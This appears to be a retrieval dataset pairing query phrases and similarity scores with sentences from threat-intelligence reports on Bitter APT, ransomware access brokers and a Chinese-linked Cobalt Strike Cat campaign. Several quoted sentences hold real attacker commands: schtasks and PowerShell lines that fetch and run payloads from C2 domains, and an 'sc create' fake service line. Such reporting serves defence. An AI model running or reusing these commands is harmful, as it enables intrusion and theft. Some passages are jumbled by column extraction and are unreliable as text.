an encoded PowerShell command stage, obfuscating the activity further than just simple string concatenation.|0.7796953354016747|"['The computer name and the username is also sent to the C2.', '""C:\\\\Windows\\\\System32\\\\schtasks.exe"" /create /sc minute /mo 15 /tn AdobeUpdater /tr ""%coMSPec% /c s^t^a^rt /^m^i^n m^s^i^e^xe^c ^/^i htt^p:/^/mirz^adih^atti^[.', ']com^/cs^s/t^ry.php?h=%computername%*%username% /^q^n ^/^norestart"" /ft We did not fetch any additional payloads from the C2, but we were served empty MSI files, allowing us to discover the names of the next stage payloads.', 'Figure 5: Empty payloads served from different C2 servers This may allow the actor to examine the server logs of beaconing infected machines before deciding whether to swap out the empty file with an actual payload if the target looks promising enough, thus protecting the next stage of the attack.', 'Bitter APT do not appear to change their tactics too much, therefore we can assume that the payloads will be similar to those observed in 2021, executing a downloader module that can be served with plugins such as a keylogger, remote access tool, file stealer, or browser credential stealer.', 'The second version of the CHM payload abstracts the same activity through an encoded PowerShell command stage, obfuscating the activity further than just simple string concatenation.', '3/6Figure 6: Encoded PowerShell command in version 2 of the CHM files The decoded command is the following: schtasks /create /tn WinSecurity /sc minute /mo 15 /tr ""powershell.exe -WindowStyle Hidden -command curl -o %LOCALAPPDATA%\\\\pic.jpg https://coauthcn[.]com/hbz.php?', 'id=%computername%;timeout 9;more %LOCALAPPDATA%\\\\pic.jpg|powershell;timeout 9;del %LOCALAPPDATA%\\\\pic.jpg"" /f It is evident that the C2 controllers have been updated also as now only the computer name is sent to the C2 and not the username.', 'What is interesting about the next version is that it now contains a decoy picture when opened: Figure 7: Decoy picture The decoy appears to reference the United Front Work Department of the Central Committee of the Chinese Communist Party.', 'The following is a machine translated version of the same picture for reference (please note that the translation will not be fully accurate and should be used for reference purposes only): 4/6Figure 8: Machine translated version of the decoy Conclusion Bitter APT have been conducting espionage campaigns for years using many tactics, including phishing, to achieve their goals.', 'It is advised that entities in government, energy, and engineering especially those in the Asia-Pacific region should remain vigilant when receiving emails, especially those claiming to be from other diplomatic entities.']"
Threat actors will look for networks that have internet-facing servers running RDP and then exploit vulnerabilities in those servers|0.8651816664156939|"['The IOCs provided throughout this report can be used to proactively query or scan environments for items such as file hashes, registry keys, and IP traffic associated with ransomware.', 'Network segmentation can halt the propagation of ransomware through an organizations network.', 'This solution involves splitting the larger network into smaller network segments and can be accomplished through firewalls, virtual local area networks, and other separation techniques.', 'If remote access solutions are crucial to daily operations, all remote access services and protocols, such as Citrix and RDP, should be implemented with two-factor or multi-factor authentication.', 'Exposed Remote Desktop Protocol (RDP) servers are also abused by threat actors to gain initial access into a targets network.', 'Threat actors will look for networks that have internet-facing servers running RDP and then exploit vulnerabilities in those servers or use brute-force password attacks.', 'Once inside the network, the threat actors move laterally and install ransomware on target machines, often disabling backups and other protections.', '7 CTA-2022-0802 Recorded Future | www.recordedfuture.comCYBER THREAT ANALYSIS Outlook Infostealer malware and exfiltrated logs will remain popular among threat actors as a means to obtain credentials to gain access to victim networks.', 'While some infostealer variants, such as RedLine, FickerStealer, and AZORult have endured, new variants like Mars Stealer, MetaStealer, and Eternity will continue to emerge.', 'Dark web shops and marketplaces will also remain an attractive source of infostealer logs for threat actors.', 'However, the most effective method by which a ransomware affiliate can gain initial access to a compromised network is through the use of an IAB on dark web and special-access forums.']"
Exposed RDP servers are also abused by threat actors to gain initial access into a targets network.|0.8908965219121487|"['Implement YARA rules like the ones found in Recorded Future Hunting Packages to identify malware via signature-based detection or SNORT rules for endpoint-based detections.', 'The IOCs provided throughout this report can be used to proactively query or scan environments for items such as file hashes, registry keys, and IP traffic associated with ransomware.', 'Network segmentation can halt the propagation of ransomware through an organizations network.', 'This solution involves splitting the larger network into smaller network segments and can be accomplished through firewalls, virtual local area networks, and other separation techniques.', 'If remote access solutions are crucial to daily operations, all remote access services and protocols, such as Citrix and RDP, should be implemented with two-factor or multi-factor authentication.', 'Exposed Remote Desktop Protocol (RDP) servers are also abused by threat actors to gain initial access into a targets network.', 'Threat actors will look for networks that have internet-facing servers running RDP and then exploit vulnerabilities in those servers or use brute-force password attacks.', 'Once inside the network, the threat actors move laterally and install ransomware on target machines, often disabling backups and other protections.', '7 CTA-2022-0802 Recorded Future | www.recordedfuture.comCYBER THREAT ANALYSIS Outlook Infostealer malware and exfiltrated logs will remain popular among threat actors as a means to obtain credentials to gain access to victim networks.', 'While some infostealer variants, such as RedLine, FickerStealer, and AZORult have endured, new variants like Mars Stealer, MetaStealer, and Eternity will continue to emerge.', 'Dark web shops and marketplaces will also remain an attractive source of infostealer logs for threat actors.']"
use brute force password attacks|0.7651758375910435|['The script, which is loaded by many sites, JS sniffers can be installed by obtaining would load a bank card JS sniffer along access to a websites administrator panel with itself.', 'with permission to edit files.', 'The login and password can be compromised through This type of malware delivery can result several methods: in rival sniffer families being hacked.', 'For stealers, i.e.', 'programs that extract instance, during one wave of infections, passwords saved in browsers; the operators of the WebRank sniffer gained access to the MagentoName malware for intercepting entered data JS sniffer code and added their malicious (including logins and passwords); code to it.', 'brute force.', 'Another example is the attack on Feedify, a real-time push notification service.', 'Hacking of third-party services By injecting the JS sniffer code into A sniffer can infiltrate a website through the code of a given file, the threat hacked third-party services, whose actor automatically uploaded the scripts work on the target website: JS sniffer to all Feedify customers, Hacking websites that provide and their sites were infected with the services for online stores (customer feedbackembad-min-1.0.js script.', 'The support chats or analytics and sniffer was injected into the Feedify statistics systems).', 'By injecting code on August 17, and was detected malicious code into the service and removed on September 11.', 'However, script code, a JS sniffer infiltrates the intruders infected the website again the code of online store websites.']
The threat actor also engaged in brute-forcing against the victim's internal web services|1.0000000000000004|"['The command-and-control infrastructure was publicly exposed to the internet.', 'Based on log and meta data found on the server, EclecticIQ analysts assess with high confidence the threat actor performed offensive cyber operations, including reconnaissance, malware delivery, and post-exploitation against selected targets.', 'EclecticIQ analysts identified a modified version of Cobalt Strike known as ""Cobalt Strike Cat""[1].', ""Researchers analyzed these logs and created a detailed map of the adversary's tactics, techniques, and procedures (TTPs)."", 'The threat actor primarily focused on exploiting four different remote code execution (RCE) vulnerabilities to target web services and heavily relied on open-source tools, some of which are exclusively available in Chinese underground forums.', ""The threat actor also engaged in brute-forcing against the victim's internal web services."", '1/19Exposed Threat Actor Infrastructure Reveals Offensive Tooling EclecticIQ analysts discovered a web server with the IP address 156[.]251[.]172[.', ']194, which was accessible to the public.', 'The server contained HTTP header data (SimpleHTTP/0.6 Python/3.8.10), indicating the use of a Python library called SIMPLEHTTPSERVER to serve the files and folders detailed in Figure 1.', 'Figure 1 Screenshot of exposed threat actor infrastructure showing available tools and target lists.. EclecticIQ analysts identified post-exploitation and reconnaissance tools on the server.', 'Most of the tools are open source.']"
brute-force attacks on systems|0.8111779804579666|['The script, which is loaded by many sites, JS sniffers can be installed by obtaining would load a bank card JS sniffer along access to a websites administrator panel with itself.', 'with permission to edit files.', 'The login and password can be compromised through This type of malware delivery can result several methods: in rival sniffer families being hacked.', 'For stealers, i.e.', 'programs that extract instance, during one wave of infections, passwords saved in browsers; the operators of the WebRank sniffer gained access to the MagentoName malware for intercepting entered data JS sniffer code and added their malicious (including logins and passwords); code to it.', 'brute force.', 'Another example is the attack on Feedify, a real-time push notification service.', 'Hacking of third-party services By injecting the JS sniffer code into A sniffer can infiltrate a website through the code of a given file, the threat hacked third-party services, whose actor automatically uploaded the scripts work on the target website: JS sniffer to all Feedify customers, Hacking websites that provide and their sites were infected with the services for online stores (customer feedbackembad-min-1.0.js script.', 'The support chats or analytics and sniffer was injected into the Feedify statistics systems).', 'By injecting code on August 17, and was detected malicious code into the service and removed on September 11.', 'However, script code, a JS sniffer infiltrates the intruders infected the website again the code of online store websites.']
The database used a weak password and was susceptible to brute-force attacks.|1.0000000000000002|"['Figure 8 Sample of Cobalt Strike Cat logs.', 'The result of the ""tasklist"" command shows that the victim was using a commercial software called SONAS [18].', 'SONAS is an application for remote monitoring and control of Internet of Things (IoT) hardware devices.', 'Analysts assess with high confidence that the compromised device was used to access CCTV cameras of the Directorate General of Highways in Taiwan.', 'Analysis showed that the victim IP address was publicly serving a web service that contained a phpMyAdmin database.', 'The database used a weak password and was susceptible to brute-force attacks.', 'Figure 9 shows the redacted victim DNS address, confirming that the web service was used by the Taiwanese government.', 'The IP addresses and the computer name matched the victim device name in the Cobalt Strike Cat logs.', '7/19Figure 9 PHPINFO page from victim web service.', 'Internal Reconnaissance to Identify Lateral Movement Opportunities EclecticIQ researchers observed multiple internal network reconnaissance attempts after initial compromise.', 'These attempts are primarily performed with an open-source automated vulnerability scanning and brute forcing tool called FSCAN.']"
List of recently opened files and folders on the computer.|0.7503568396222421|"['net user Displays information about user accounts.', 'Used to search for the string ""DBPath"" in all files within findstr /s /i ""DBPath"" *.', '* the current directory and its subdirectories.', 'arp a Address resolutions for remote systems.', 'netsh wlan show profiles Display a list of all the wireless network profiles.', 'dir List of recently opened files and folders on the %APPDATA%\\\\Microsoft\\\\Windows\\\\Recent computer.', '9/19Figure 11 shows some examples of commands executed by the threat actor on an infected host: Figure 11 Executed reconnaissance commands on infected host.', 'Escalate Privileges with Stolen Credentials The threat actor uses stolen passwords from valid accounts as the primary vector for privilege escalation.', 'The actor deployed various credential stealing techniques against compromised hosts to obtain user account passwords in NTLM hash format and saved credentials from web browser.', 'These passwords would allow the threat actor to escalate privileges using valid accounts if the accounts were privileged .', ""The Cobalt Strike Cat beacon logs (Figure 12) show that the actor uploaded LaZagne onto the infected device for credential harvesting purposes and deleted the LaZagne binary after execution to avoid detection from the user's side.""]"
the reverse SOCKS proxy activity on the infected device using the open-source tool FRP.|0.8908652070333382|"['11/19Malicious service installation is accomplished via the below command line argument: sc create WindowsUpdate binPath= C:\\\\Windows\\\\Temp\\\\svchost.exe start= auto obj= LocalSystem DisplayName= windowsupdate When this command is executed on remote victim device, it will install a fake Windows service called windowsupdate.This service executes a malicious binary (Cobalt Strike Cat payload) under C:\\\\Windows\\\\Temp\\\\svchost.exe every time the victim device is started.', 'Figure 14 Installation of malicious Windows service.', 'Move Laterally Trough Reverse Proxy The threat actor utilized open-source reverse proxy tools to expose local devices located behind a NAT or firewall, to the Internet.', 'This allowed the attacker to conduct vulnerability scans, general reconnaissance, and brute-force attacks on systems attached to the internal network of the infected device.', 'Threat actor uploaded the fast reverse proxy (FRP) binary to the ""C:\\\\Windows\\\\Temp"" file path and then executed it on victim machine.', 'Figure 15 displays the reverse SOCKS proxy activity on the infected device using the open-source tool FRP.', 'FRP received a command-line argument from attacker used to establish a connection from the adversary-controlled infrastructure (156[.]251[.]172[.', ']194) over port 2333.', '12/19Figure 15 Execution of FRP reverse SOCKS proxy on infected host.', 'After establishing the reverse SOCKS proxy connection, the threat actor performed internal reconnaissance and brute forcing attempts on some of the internal FTP servers inside victim network.', 'Victimology and Targeting Patterns EclecticIQ researchers assess with moderate confidence that the primary targets of the threat actor are Taiwanese government entities and organizations in the critical infrastructures sector.']"
The threat actor utilized open-source reverse proxy tools to expose local devices located behind a NAT or firewall, to the Internet.|0.8451105414787842|"['Figure 13 Execution of Hack-browser-data on infected host.', 'Maintain Presence via Windows Service Installation To establish persistent remote access on the victim device, the threat actor abused Windows services to install modified version of Cobalt Strike payload.', 'Windows services ran with the highest privilege, NT AUTHORITY\\\\SYSTEM and execute the malware automatically during system startup, allowing for remote access to the victim device with persistence.', '11/19Malicious service installation is accomplished via the below command line argument: sc create WindowsUpdate binPath= C:\\\\Windows\\\\Temp\\\\svchost.exe start= auto obj= LocalSystem DisplayName= windowsupdate When this command is executed on remote victim device, it will install a fake Windows service called windowsupdate.This service executes a malicious binary (Cobalt Strike Cat payload) under C:\\\\Windows\\\\Temp\\\\svchost.exe every time the victim device is started.', 'Figure 14 Installation of malicious Windows service.', 'Move Laterally Trough Reverse Proxy The threat actor utilized open-source reverse proxy tools to expose local devices located behind a NAT or firewall, to the Internet.', 'This allowed the attacker to conduct vulnerability scans, general reconnaissance, and brute-force attacks on systems attached to the internal network of the infected device.', 'Threat actor uploaded the fast reverse proxy (FRP) binary to the ""C:\\\\Windows\\\\Temp"" file path and then executed it on victim machine.', 'Figure 15 displays the reverse SOCKS proxy activity on the infected device using the open-source tool FRP.', 'FRP received a command-line argument from attacker used to establish a connection from the adversary-controlled infrastructure (156[.]251[.]172[.', ']194) over port 2333.']"
Execution of FRP reverse SOCKS proxy on infected host.|0.8100892647300504|"['This allowed the attacker to conduct vulnerability scans, general reconnaissance, and brute-force attacks on systems attached to the internal network of the infected device.', 'Threat actor uploaded the fast reverse proxy (FRP) binary to the ""C:\\\\Windows\\\\Temp"" file path and then executed it on victim machine.', 'Figure 15 displays the reverse SOCKS proxy activity on the infected device using the open-source tool FRP.', 'FRP received a command-line argument from attacker used to establish a connection from the adversary-controlled infrastructure (156[.]251[.]172[.', ']194) over port 2333.', '12/19Figure 15 Execution of FRP reverse SOCKS proxy on infected host.', 'After establishing the reverse SOCKS proxy connection, the threat actor performed internal reconnaissance and brute forcing attempts on some of the internal FTP servers inside victim network.', 'Victimology and Targeting Patterns EclecticIQ researchers assess with moderate confidence that the primary targets of the threat actor are Taiwanese government entities and organizations in the critical infrastructures sector.', 'Logs obtained from attacker infrastructure, such as target lists and metadata show that organizations in Taiwan account for the largest proportion of targets.', 'According to event logs, on 02/09 at 08:51:43 UTC, EclecticIQ researchers have concluded with high confidence that the actor compromised an IOT device in the network of the Directorate General of Highways, MOTC in Taiwan [19].', 'After this initial comprise the threat actor performed reconnaissance and credential harvesting from infected host, very likely to perform lateral movement as an end goal.']"
Installation of malicious Windows service.|0.773953390023711|"['This is a stealth tactic to bypass firewalls and AV by creating a new explorer.exe process and injecting shellcode into the entry point and then terminating the explorer.exe process in the shellcode immediately afterwards.', 'AV Engine Detection.', 'The malware checks whether Bitdefender is installed by checking for the mutex ""BDAgent-oneinstance-mutex"" via the CreateMutexA API.', 'It then checks if AVG is installed by looking for an event named ""AVG{53036606-6F17-41a9-80DD-AB930D6BA4DD}"" via the CreateEventA API.', 'If either of these exists, the malware will terminate execution.', 'Service Installation.', 'So long as AVG and Bitdefender are not detected, the malware will copy itself to %COMMONPROGRAMFILES%\\\\CompSvc.exe.', 'It also creates the file %COMMONPROGRAMFILES%\\\\SvcStart.exe, which is embedded within the malware.', 'It then injects shellcode into a new explorer.exe in order to execute SvcStart.exe with the following command line: SvcStart.exe R2D2 C:\\\\Documents and Settings\\\\user\\\\Local Settings\\\\Temp\\\\filename.ext Where ""C:\\\\Documents and Settings\\\\user\\\\Local Settings\\\\Temp\\\\filename.ext"" is the location of the original malware file.', 'Analysis indicates that there are two command line prefixes: R2D2: Terminates the currently running malware, deletes it from hard-disk and then executes the newly copied version in the common program files directory.', 'R2D3: Does not require a directory to be given in the command line string and results in SvcStart.exe dropping a batch file named exp.bat in the %TEMP% directory, which simply cleans up all of the malware as below: :REPEAT DEL %1 IF EXIST %1 GOTO REPEAT DEL %2 TLP-WHITE | 25The R2D2 command line is the only one seen used during live analysis, whereas R2D3 appears to be a clean- up function.']"
Installation of malicious Windows service.|0.8336581649602418|"['The threat actor utilized an open-source tool called HackBrowserData to export victim browser data, including passwords, history, cookies, bookmarks and download records from several web browsers.', 'Figure 13 Execution of Hack-browser-data on infected host.', 'Maintain Presence via Windows Service Installation To establish persistent remote access on the victim device, the threat actor abused Windows services to install modified version of Cobalt Strike payload.', 'Windows services ran with the highest privilege, NT AUTHORITY\\\\SYSTEM and execute the malware automatically during system startup, allowing for remote access to the victim device with persistence.', '11/19Malicious service installation is accomplished via the below command line argument: sc create WindowsUpdate binPath= C:\\\\Windows\\\\Temp\\\\svchost.exe start= auto obj= LocalSystem DisplayName= windowsupdate When this command is executed on remote victim device, it will install a fake Windows service called windowsupdate.This service executes a malicious binary (Cobalt Strike Cat payload) under C:\\\\Windows\\\\Temp\\\\svchost.exe every time the victim device is started.', 'Figure 14 Installation of malicious Windows service.', 'Move Laterally Trough Reverse Proxy The threat actor utilized open-source reverse proxy tools to expose local devices located behind a NAT or firewall, to the Internet.', 'This allowed the attacker to conduct vulnerability scans, general reconnaissance, and brute-force attacks on systems attached to the internal network of the infected device.', 'Threat actor uploaded the fast reverse proxy (FRP) binary to the ""C:\\\\Windows\\\\Temp"" file path and then executed it on victim machine.', 'Figure 15 displays the reverse SOCKS proxy activity on the infected device using the open-source tool FRP.', 'FRP received a command-line argument from attacker used to establish a connection from the adversary-controlled infrastructure (156[.]251[.]172[.']"
"Malicious service installation is accomplished via the below command line argument:
sc create WindowsUpdate binPath= C:\Windows\Temp\svchost.exe start= auto obj= LocalSystem DisplayName= windowsupdate"|0.7990965563641753|"['10/19Figure 12 Threat actor successfully obtained user account credentials in NTLM format.', 'The threat actor utilized an open-source tool called HackBrowserData to export victim browser data, including passwords, history, cookies, bookmarks and download records from several web browsers.', 'Figure 13 Execution of Hack-browser-data on infected host.', 'Maintain Presence via Windows Service Installation To establish persistent remote access on the victim device, the threat actor abused Windows services to install modified version of Cobalt Strike payload.', 'Windows services ran with the highest privilege, NT AUTHORITY\\\\SYSTEM and execute the malware automatically during system startup, allowing for remote access to the victim device with persistence.', '11/19Malicious service installation is accomplished via the below command line argument: sc create WindowsUpdate binPath= C:\\\\Windows\\\\Temp\\\\svchost.exe start= auto obj= LocalSystem DisplayName= windowsupdate When this command is executed on remote victim device, it will install a fake Windows service called windowsupdate.This service executes a malicious binary (Cobalt Strike Cat payload) under C:\\\\Windows\\\\Temp\\\\svchost.exe every time the victim device is started.', 'Figure 14 Installation of malicious Windows service.', 'Move Laterally Trough Reverse Proxy The threat actor utilized open-source reverse proxy tools to expose local devices located behind a NAT or firewall, to the Internet.', 'This allowed the attacker to conduct vulnerability scans, general reconnaissance, and brute-force attacks on systems attached to the internal network of the infected device.', 'Threat actor uploaded the fast reverse proxy (FRP) binary to the ""C:\\\\Windows\\\\Temp"" file path and then executed it on victim machine.', 'Figure 15 displays the reverse SOCKS proxy activity on the infected device using the open-source tool FRP.']"
To establish persistent remote access on the victim device, the threat actor abused Windows services to install modified version of Cobalt Strike payload|0.8671783723113209|[]
installed a second stage persistence backdoor on infected device by abusing Windows Services.|0.948861951353165|"['Intrusion detection systems: Deploying an intrusion detection system (IDS) can help identify and alert administrators to malicious activities such as port scans or network sweeps.', 'Web application firewalls: Web application firewalls (WAF) can be used to protect web services from reconnaissance attempts by blocking or limiting access to resources and detecting and blocking known malicious patterns in web traffic.', 'The threat actor used a variation of Cobalt Strike as a command and control (C2) server to send malicious commands into infected computers.', 'Some tips to help prevent such C2 connection attempts: Monitor network traffic: Monitor network traffic regularly to detect unusual activities or traffic patterns that may indicate C&C connections.', 'Deploy firewalls: Deploy firewalls to block traffic from known C&C domains or IP addresses.', 'The threat actor installed a second stage persistence backdoor on infected device by abusing Windows Services.', 'The actor then tried to dump User Account credentials via SAM database and attempted to access saved browser credentials.', 'There are several ways to use Windows Group Policy to avoid these kinds of post exploitation attempts: Disable the ""Create global objects"" user right: This user right allows non-administrative users to create global objects, including services.', 'By disabling this user right, you can prevent non-administrative users from creating services.', 'Restrict access to the Security Accounts Manager (SAM) file: The SAM file contains sensitive information, including user account passwords.', 'By default, only the SYSTEM account has access to the SAM file.']"
Windows services ran with the highest privilege, NT AUTHORITY\SYSTEM and execute the malware automatically during system startup, allowing for remote access to the victim device with persistence.|1.0|"['The actor leveraged ONE-FOX - a collection of pentest tools - to copy binaries from actors system to the victim.', '10/19Figure 12 Threat actor successfully obtained user account credentials in NTLM format.', 'The threat actor utilized an open-source tool called HackBrowserData to export victim browser data, including passwords, history, cookies, bookmarks and download records from several web browsers.', 'Figure 13 Execution of Hack-browser-data on infected host.', 'Maintain Presence via Windows Service Installation To establish persistent remote access on the victim device, the threat actor abused Windows services to install modified version of Cobalt Strike payload.', 'Windows services ran with the highest privilege, NT AUTHORITY\\\\SYSTEM and execute the malware automatically during system startup, allowing for remote access to the victim device with persistence.', '11/19Malicious service installation is accomplished via the below command line argument: sc create WindowsUpdate binPath= C:\\\\Windows\\\\Temp\\\\svchost.exe start= auto obj= LocalSystem DisplayName= windowsupdate When this command is executed on remote victim device, it will install a fake Windows service called windowsupdate.This service executes a malicious binary (Cobalt Strike Cat payload) under C:\\\\Windows\\\\Temp\\\\svchost.exe every time the victim device is started.', 'Figure 14 Installation of malicious Windows service.', 'Move Laterally Trough Reverse Proxy The threat actor utilized open-source reverse proxy tools to expose local devices located behind a NAT or firewall, to the Internet.', 'This allowed the attacker to conduct vulnerability scans, general reconnaissance, and brute-force attacks on systems attached to the internal network of the infected device.', 'Threat actor uploaded the fast reverse proxy (FRP) binary to the ""C:\\\\Windows\\\\Temp"" file path and then executed it on victim machine.']"
the threat actor used private proxy addresses from a Chinese underground proxy IP solution called 'Tigercloud Club' to conceal their real IP address.|0.9229701037227|"['The timezone of attacker virtual sandbox 103[.]156[.]184[.', ']83 is in the UTC+08:00 timezone.', 'This time zone is used in all predominantly Chinese-speaking regions.', '4.', ""Every successful login attempt made by the attacker using the default Cobalt Strike username 'neo' to access the command-and-control server was logged, along with the attacker's IP address."", ""EclecticIQ researchers observed that the threat actor used private proxy addresses from a Chinese underground proxy IP solution called 'Tigercloud Club' to conceal their real IP address."", '5.', 'Some of tools used by the actor are exclusively available in Chinese underground forums.', '6.', 'The identified adversary TTPs overlap with a previously known Chinese APT group called Budworm [20].', '14/19Cobalt Strike Cat event logs: Figure 17 Event logs from Cobalt Strike Cat showing details about victim and threat actor.']"
Reverse proxy tool|0.7975484501383633|['While HyperBro was frequently used, the attackers also used the PlugX/Korplug Trojan as a payload at times.', 'Other tools used in recent attacks include: Cobalt Strike: An off-the-shelf tool that can be used to load shellcode onto victim machines.', 'It has legitimate uses as a penetration testing tool but is frequently exploited by malicious actors.', 'LaZagne: A publicly available credential dumping tool.', 'IOX: A publicly available proxy and port-forwarding tool.', 'Fast Reverse Proxy (FRP): A reverse proxy tool.', 'Fscan: A publicly available intranet scanning tool.', 'Conclusion Budworm is known for mounting ambitious attacks against high-value targets.', 'While there were frequent reports of Budworm targeting U.S. organizations six to eight years ago, in more recent years the groups activity appears to have been largely focused on Asia, the Middle East, and Europe.', 'However this is the second time in recent months, Budworm has been linked to attacks against a U.S-based target.', 'A recent CISA report on multiple APT groups attacking a defense sector organization mentioned Budworms toolset.']
Threat actor uploaded the fast reverse proxy (FRP) binary|0.7703092422971287|"['Windows services ran with the highest privilege, NT AUTHORITY\\\\SYSTEM and execute the malware automatically during system startup, allowing for remote access to the victim device with persistence.', '11/19Malicious service installation is accomplished via the below command line argument: sc create WindowsUpdate binPath= C:\\\\Windows\\\\Temp\\\\svchost.exe start= auto obj= LocalSystem DisplayName= windowsupdate When this command is executed on remote victim device, it will install a fake Windows service called windowsupdate.This service executes a malicious binary (Cobalt Strike Cat payload) under C:\\\\Windows\\\\Temp\\\\svchost.exe every time the victim device is started.', 'Figure 14 Installation of malicious Windows service.', 'Move Laterally Trough Reverse Proxy The threat actor utilized open-source reverse proxy tools to expose local devices located behind a NAT or firewall, to the Internet.', 'This allowed the attacker to conduct vulnerability scans, general reconnaissance, and brute-force attacks on systems attached to the internal network of the infected device.', 'Threat actor uploaded the fast reverse proxy (FRP) binary to the ""C:\\\\Windows\\\\Temp"" file path and then executed it on victim machine.', 'Figure 15 displays the reverse SOCKS proxy activity on the infected device using the open-source tool FRP.', 'FRP received a command-line argument from attacker used to establish a connection from the adversary-controlled infrastructure (156[.]251[.]172[.', ']194) over port 2333.', '12/19Figure 15 Execution of FRP reverse SOCKS proxy on infected host.', 'After establishing the reverse SOCKS proxy connection, the threat actor performed internal reconnaissance and brute forcing attempts on some of the internal FTP servers inside victim network.']"
the threat actor primarily focuses on four different known remote code execution (RCE) vulnerabilities during their operations:•    CVE-2023-21839      Oracle WebLogic Server RCE [13]•    CVE-2021-3129      Laravel debug mode RCE [14]•    CVE-2020-2551      Oracle WebLogic RCE [15]•    CVE-2021-44228     Apache Log4j [16]|0.8963874313673957|[]
the threat actor primarily focuses on four different known remote code execution (RCE) vulnerabilities during their operations:•    CVE-2023-21839      Oracle WebLogic Server RCE [13]•    CVE-2021-3129      Laravel debug mode RCE [14]•    CVE-2020-2551      Oracle WebLogic RCE [15]•    CVE-2021-44228     Apache Log4j [16]|0.7726251019006274|"['Figure 3 shows an example of a target list created by the attacker, which mainly contains Taiwanese government entities.', 'This list served as input for OneForAll - a subdomain enumeration tool.Figure 3 Files inside the exposed infrastructureunder the OneForAll file path.After enumerating subdomains of the associated victim network, the threat actor uses automated vulnerability scanning tools includingNucleiandAfrogto identify potentially exploitable systems.', 'Figure 4 shows final report logs from Afrog and Nuclei found on the attacker infrastructure.The threat actor utilized virtual sandboxes named ""Test"" to demonstrate cyber-attacks before executing them on a real victim device.', 'The IP addresses observed in these virtual sandboxes are tied to the same computer name, identified as DESKTOP-0TBCAC4.', 'The adversary also demonstrated an interest in exploring the public-facing network surface of public transport and utilities industries.Figure 4 Completed reconnaissance and vulnerability scans.Initial Compromise Through Exploiting Publicly Facing ApplicationsThe threat actor utilized automated vulnerability discovery and reconnaissance techniques to scan a given target list, refine the selection and identify potential exploitable systems before commencing the attack.', 'Based on evidence obtained from the bash history data, EclecticIQ researchers observed that the threat actor primarily focuses on four different known remote code execution (RCE) vulnerabilities during their operations: CVE-2023-21839  Oracle WebLogic Server RCE [13] CVE-2021-3129  Laravel debug mode RCE [14] CVE-2020-2551  Oracle WebLogic RCE [15] CVE-2021-44228  Apache Log4j [16]Figure 5 BASH history logs of from the threat actorssystem showing exploitation of CVE-2020-2551.Establish Foothold by Modified Version of Cobalt StrikeThe threat actor utilized a modified version of Cobalt Strike 4.5, dubbed ""Cobalt Strike Cat"", to create a dedicated communication channel from the victim system and perform evasive post-exploitation steps.', 'Cobalt Strike Cat was initially shared on a Chinese-speaking cybersecurity forum called t00ls[.', ']com, with a link to a GitHub repository and was distributed inside an encrypted ZIP folder.', 'Only registered users of t00ls[.', ']com could obtain the decryption key for the ZIP folder and access the tool.', 'Notably, t00ls[.']"
the victim IP address was publicly serving a web service that contained a phpMyAdmin database.|0.9217985493976397|"['The attacker then changed the Cobalt Strike Cat beaconing frequency for behaviour-based evasion by sending the ""sleep 10"" command to the infected host and executed the ""tasklist /SVC"" command to list all running processes on the victim device.', 'Figure 8 Sample of Cobalt Strike Cat logs.', 'The result of the ""tasklist"" command shows that the victim was using a commercial software called SONAS [18].', 'SONAS is an application for remote monitoring and control of Internet of Things (IoT) hardware devices.', 'Analysts assess with high confidence that the compromised device was used to access CCTV cameras of the Directorate General of Highways in Taiwan.', 'Analysis showed that the victim IP address was publicly serving a web service that contained a phpMyAdmin database.', 'The database used a weak password and was susceptible to brute-force attacks.', 'Figure 9 shows the redacted victim DNS address, confirming that the web service was used by the Taiwanese government.', 'The IP addresses and the computer name matched the victim device name in the Cobalt Strike Cat logs.', '7/19Figure 9 PHPINFO page from victim web service.', 'Internal Reconnaissance to Identify Lateral Movement Opportunities EclecticIQ researchers observed multiple internal network reconnaissance attempts after initial compromise.']"
the decryption key for the ZIP folder and access the tool|0.8543651362675966|"['Based on evidence obtained from the bash history data, EclecticIQ researchers observed that the threat actor primarily focuses on four different known remote code execution (RCE) vulnerabilities during their operations: CVE-2023-21839 Oracle WebLogic Server RCE [13] CVE-2021-3129 Laravel debug mode RCE [14] CVE-2020-2551 Oracle WebLogic RCE [15] CVE-2021-44228 Apache Log4j [16] Figure 5 BASH history logs of from the threat actors system showing exploitation of CVE-2020-2551.', 'Establish Foothold by Modified Version of Cobalt Strike The threat actor utilized a modified version of Cobalt Strike 4.5, dubbed ""Cobalt Strike Cat"", to create a dedicated communication channel from the victim system and perform evasive post-exploitation steps.', 'Cobalt Strike Cat was initially shared on a Chinese-speaking cybersecurity forum called t00ls[.', ']com, with a link to a GitHub repository and was distributed inside an encrypted ZIP folder.', 'Only registered users of t00ls[.', ']com could obtain the decryption key for the ZIP folder and access the tool.', 'Notably, t00ls[.', ']com is a private forum that can only be accessed by individuals who possess invitation codes for the site.', '5/19Figure 6 I want to become a master hacker.', 'Publication of Cobalt Strike Cat on t00ls[.]com.', 'Figure 7 Example user interface of Cobalt Strike Cat shared on a GitHub repository.']"
the decryption key for the ZIP folder and access the tool|0.8543651362675966|"['The adversary also demonstrated an interest in exploring the public-facing network surface of public transport and utilities industries.Figure 4 Completed reconnaissance and vulnerability scans.Initial Compromise Through Exploiting Publicly Facing ApplicationsThe threat actor utilized automated vulnerability discovery and reconnaissance techniques to scan a given target list, refine the selection and identify potential exploitable systems before commencing the attack.', 'Based on evidence obtained from the bash history data, EclecticIQ researchers observed that the threat actor primarily focuses on four different known remote code execution (RCE) vulnerabilities during their operations: CVE-2023-21839  Oracle WebLogic Server RCE [13] CVE-2021-3129  Laravel debug mode RCE [14] CVE-2020-2551  Oracle WebLogic RCE [15] CVE-2021-44228  Apache Log4j [16]Figure 5 BASH history logs of from the threat actorssystem showing exploitation of CVE-2020-2551.Establish Foothold by Modified Version of Cobalt StrikeThe threat actor utilized a modified version of Cobalt Strike 4.5, dubbed ""Cobalt Strike Cat"", to create a dedicated communication channel from the victim system and perform evasive post-exploitation steps.', 'Cobalt Strike Cat was initially shared on a Chinese-speaking cybersecurity forum called t00ls[.', ']com, with a link to a GitHub repository and was distributed inside an encrypted ZIP folder.', 'Only registered users of t00ls[.', ']com could obtain the decryption key for the ZIP folder and access the tool.', 'Notably, t00ls[.', ']com is a private forum that can only be accessed by individuals who possess invitation codes for the site.Figure 6 I want to become a master hacker.Publication of Cobalt Strike Cat on t00ls[.', ']com.Figure 7 Example user interface of Cobalt Strike Catshared on a GitHub repository.Notable features of Cobalt Strike Cat include:1.', 'Evasion techniques to specially bypass Anti-Virus solution 360 Total Security, which is a Beijing, China-registered internet security company mostly used in Asia-Pacific region.2.', 'Option to use Google 2FA key during login to the command-and-control 